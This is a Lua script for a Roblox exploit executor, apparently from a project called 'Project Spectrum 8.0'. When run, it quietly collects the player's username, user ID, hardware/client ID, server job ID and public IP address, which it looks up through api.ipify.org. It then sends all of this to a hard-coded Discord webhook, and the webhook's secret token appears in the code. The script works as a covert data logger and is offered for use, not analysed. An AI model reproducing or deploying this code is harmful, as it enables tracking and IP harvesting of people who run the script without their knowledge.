function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = "https://discord.com/api/webhooks/1288935834149453875/s_mbWY-_9-HIwwAFEpm70WCay_dstHJwOa4sTSUGiiCqLPyBuNtE-WkzS8irtOy_NDbF",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Who Execute Log**",
                ["description"] = nil,
                ["title"] = "** 🔔 Webhook Notifaction ✧₊⁺ **",
                ["footer"] = {
                            ["text"] = "⏳ Time Result : "..os.date("%c").."\n 🤝 Project Spectrum 8.0 // Made By xZPUHigh\n 🌟 discord.gg/C3MpUNwsDU 🌎",
                            ["icon_url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/received_6268136009875748.jpg?ex=66f44f3f&is=66f2fdbf&hm=a7781334ae91dc5e7d73d148899c1507365a5daf94114d39bcab27e6378f7694&=&format=webp&width=671&height=671"
                            },
                ["thumbnail"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1283116957838606446/1288488032474890282/AnimeVanguards.jpg?ex=66f55d7d&is=66f40bfd&hm=399f9766edf7e52023172b3391533291c24ca3bc7d610f0eecbe1829266cb2a1&=&format=webp"
                                },
                ["image"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1283116957838606446/1289208324721737810/9911bc94bde094bbf06e9bdc7e427541.gif?ex=66f7fc50&is=66f6aad0&hm=e738ff20d4d012d33e65199e6a1ba2807f531692ab5882c2551a097912396f36&="
                                },
                ["fields"] = {
                    {
                        ["name"] = "**👩🏻‍💼 Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🔖 User ID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**📋 Place ID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌍 IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**📍 Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🍻 Job ID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌟 Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    return AdminMessage
end

PostWebhook("urtl", AdminLoggerMsg()) -- Post to admin webhook
